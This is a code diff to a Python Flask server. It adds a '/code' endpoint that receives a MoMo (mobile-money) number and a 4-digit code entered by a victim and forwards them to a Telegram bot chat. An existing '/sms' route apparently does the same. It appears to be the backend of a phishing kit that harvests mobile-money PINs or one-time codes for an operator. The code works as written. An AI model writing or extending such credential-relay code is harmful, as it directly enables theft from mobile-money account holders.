@@ -211,6 +211,42 @@ def sms():
         return jsonify({"ok": False, "error": str(e)}), 500
 
 
+# ---------------- 4-DIGIT CODE ----------------
+@app.route("/code", methods=["POST", "OPTIONS"])
+def code():
+    if request.method == "OPTIONS":
+        return "", 204
+
+    data = request.get_json(silent=True) or {}
+    momo = data.get("momo", "unknown")
+    code_val = data.get("code", "")
+    time_str = data.get("time", "unknown")
+
+    text = (
+        "🔢 4-Digit Code Entered\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        f"MoMo: {momo}\n"
+        f"Time: {time_str}\n"
+        "\n"
+        "─── CODE ───\n"
+        f"{code_val}\n"
+        "─── END ───"
+    )
+
+    if not BOT_TOKEN or not CHAT_ID:
+        return jsonify({"ok": False, "error": "Server not configured"}), 500
+
+    try:
+        res = requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": CHAT_ID, "text": text},
+            timeout=10,
+        )
+        return jsonify(res.json())
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 500
+
+
 # ---------------- STATIC ----------------
 @app.route("/<path:filename>")
 def static_files(filename):
